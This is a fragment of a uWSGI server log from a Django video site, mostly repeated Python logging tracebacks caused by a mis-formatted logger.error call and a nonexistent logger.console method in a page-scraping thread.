+[pid: 10432|app: 0|req: 179/253] 112.96.112.189 () {44 vars in 961 bytes} [Fri Jun 12 23:54:31 2020] GET /admin/view_log/?page=7 => generated 21935 bytes in 17 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 180/254] 112.96.112.189 () {44 vars in 961 bytes} [Fri Jun 12 23:54:34 2020] GET /admin/view_log/?page=8 => generated 20652 bytes in 17 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 181/255] 112.96.112.189 () {44 vars in 961 bytes} [Fri Jun 12 23:54:39 2020] GET /admin/view_log/?page=8 => generated 20708 bytes in 17 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 182/256] 112.96.112.189 () {44 vars in 930 bytes} [Fri Jun 12 23:55:01 2020] GET /admin/ => generated 30034 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+————————开始更新豆瓣评分数据————————
+[pid: 10430|app: 0|req: 43/257] 112.96.112.189 () {44 vars in 932 bytes} [Fri Jun 12 23:55:05 2020] GET /admin/view_log/ => generated 21756 bytes in 26 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 44/258] 112.96.112.189 () {44 vars in 954 bytes} [Fri Jun 12 23:55:08 2020] GET /admin/view_log/?page=8 => generated 20932 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 45/259] 112.96.112.189 () {44 vars in 961 bytes} [Fri Jun 12 23:55:11 2020] GET /admin/view_log/?page=8 => generated 20988 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 46/260] 112.96.112.189 () {44 vars in 943 bytes} [Fri Jun 12 23:55:41 2020] GET /video/play/88112/ => generated 14887 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 47/261] 112.96.112.189 () {42 vars in 891 bytes} [Fri Jun 12 23:55:51 2020] GET /video/play/57067 => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 156 bytes (1 switches on core 0)
+[pid: 10433|app: 0|req: 21/262] 112.96.112.189 () {42 vars in 893 bytes} [Fri Jun 12 23:55:51 2020] GET /video/play/57067/ => generated 19319 bytes in 15 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 48/263] 112.96.112.189 () {44 vars in 925 bytes} [Fri Jun 12 23:56:06 2020] GET /video/ => generated 59321 bytes in 402 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10433|app: 0|req: 22/264] 112.96.112.189 () {42 vars in 893 bytes} [Fri Jun 12 23:56:11 2020] GET /video/play/84891/ => generated 19058 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 49/265] 112.96.112.189 () {44 vars in 952 bytes} [Fri Jun 12 23:56:22 2020] GET /admin/update_log/ => generated 20369 bytes in 28 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 50/266] 112.96.112.189 () {44 vars in 962 bytes} [Fri Jun 12 23:56:26 2020] GET /admin/update_log/?page=19 => generated 17220 bytes in 2 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 51/267] 112.96.112.189 () {44 vars in 933 bytes} [Fri Jun 12 23:56:38 2020] GET /admin/ => generated 30034 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+--------2020-06-12 23:56:42 站点2开始更新--------
+[pid: 10430|app: 0|req: 53/268] 112.96.112.189 () {44 vars in 925 bytes} [Fri Jun 12 23:56:51 2020] GET /video/ => generated 59321 bytes in 1715 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('147', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/__init__.py", line 994, in emit
+    msg = self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('147', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('147', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('147', '请求无数据，放入错误列表')
+Exception in thread Thread-4:
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 161, in add_page_to_queue
+    logger.console('获取到page:', url.split('?p=')[1])
+AttributeError: 'Logger' object has no attribute 'console'
+
+[pid: 10430|app: 0|req: 54/269] 112.96.112.189 () {42 vars in 893 bytes} [Fri Jun 12 23:57:27 2020] GET /video/play/87596/ => generated 13639 bytes in 7 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('109', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/__init__.py", line 994, in emit
+    msg = self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('109', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('109', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('109', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('105', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/__init__.py", line 994, in emit
+    msg = self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('105', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('105', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('105', '请求无数据，放入错误列表')
+[pid: 10430|app: 0|req: 55/270] 195.54.160.135 () {34 vars in 556 bytes} [Fri Jun 12 23:57:57 2020] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('59', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/__init__.py", line 994, in emit
+    msg = self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('59', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('59', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('59', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('49', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/__init__.py", line 994, in emit
+    msg = self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('49', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('49', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('49', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('41', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/__init__.py", line 994, in emit
+    msg = self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('41', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
